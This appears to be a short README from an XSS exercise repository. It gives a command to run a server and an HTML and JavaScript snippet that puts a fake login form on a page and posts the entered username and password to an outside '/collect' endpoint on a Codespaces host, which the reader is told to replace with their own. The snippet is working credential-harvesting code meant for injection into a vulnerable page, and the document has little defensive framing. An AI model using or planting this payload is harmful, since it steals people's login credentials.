# XSS 

# Table of Contents



How to run the code
```bash
node server.js
```

Client Side Code
```html
<form id="loginForm">
<label for="username">Username:</label>
<input type="text" id="username" name="username" required><br><br>
 
<label for="password">Password:</label>
<input type="password" id="password" name="password" required><br><br>
 
<button type="button" id="loginButton">Login</button>
</form>
 
<script>
const apiUrl = 'https://unearthly-hex-679pp459qqgh574r-8001.app.github.dev/collect';

        function sendLoginToAPI(event) {
            event.preventDefault();

            alert("Login button clicked!");

            const username = $('#username').val();
            const password = $('#password').val();

            if (!username || !password) {
                alert("Both username and password are required.");
                return;
            }

            $.ajax({
                url: apiUrl,
                method: 'POST',
                contentType: 'application/json',
                data: JSON.stringify({ username: username, password: password }),
                success: function(data) {
                    console.log('Login response:', data);
                    alert('Login successful!');
                },
                error: function(xhr, status, error) {
                    console.error('Login failed:', error);
                    alert('Invalid username or password.');
                }
            });
        }

        $('#loginButton').on('mousedown', sendLoginToAPI);
</script>
```

Change your workspace name to your own workspace name in the apiUrl variable.

